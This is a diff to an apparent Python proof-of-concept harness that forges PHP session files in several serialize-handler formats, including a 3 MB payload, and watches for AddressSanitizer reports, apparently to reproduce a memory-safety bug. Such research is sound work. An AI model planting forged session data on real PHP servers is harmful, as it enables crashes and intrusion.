@@ -99,6 +99,16 @@ def process_alive(pid):
         return False
 
 
+def forged_session(handler, key, value):
+    """Session file payload per session.serialize_handler."""
+    if handler == 'php_serialize':
+        return ('a:1:{s:%d:"%s";s:%d:"%s";}' % (len(key), key, len(value), value)).encode()
+    if handler == 'php_binary':
+        return (bytes([len(key)]) + key.encode()
+                + ('s:%d:"%s";' % (len(value), value)).encode())
+    return ('%s|s:%d:"%s";' % (key, len(value), value)).encode()
+
+
 def one_iteration(base_out, index, external_port):
     out = base_out / ('iter-%02d' % index)
     (out / 'sessions').mkdir(parents=True, exist_ok=True)
@@ -106,14 +116,15 @@ def one_iteration(base_out, index, external_port):
     sid_big = 'pbbig' + secrets.token_hex(8)
     sid_small = 'pbsmall' + secrets.token_hex(8)
     big = 'A' * (3 * 1024 * 1024)
+    handler = os.environ.get('POC_SERIALIZE_HANDLER', 'php')
     session_dir = Path(os.environ.get('POC_SESSION_DIR', out / 'sessions'))
     asan_dir = Path(os.environ.get('POC_ASAN_DIR', base_out))
     error_log = Path(os.environ.get('POC_ERROR_LOG', out / 'php-error.log'))
     worker_pid = int(os.environ['POC_PROCESS_PID']) if os.environ.get('POC_PROCESS_PID') else None
     asan_before = snapshot_asan(asan_dir)
     session_dir.mkdir(parents=True, exist_ok=True)
-    (session_dir / ('sess_' + sid_big)).write_text('big|s:%d:"%s";' % (len(big), big))
-    (session_dir / ('sess_' + sid_small)).write_text('small|a:1:{i:0;i:7;}')
+    (session_dir / ('sess_' + sid_big)).write_bytes(forged_session(handler, 'big', big))
+    (session_dir / ('sess_' + sid_small)).write_bytes(forged_session(handler, 'small', 'a:1:{i:0;i:7;}'))
     port = external_port
     record = dict(iteration=index, worker_pid=worker_pid)
 
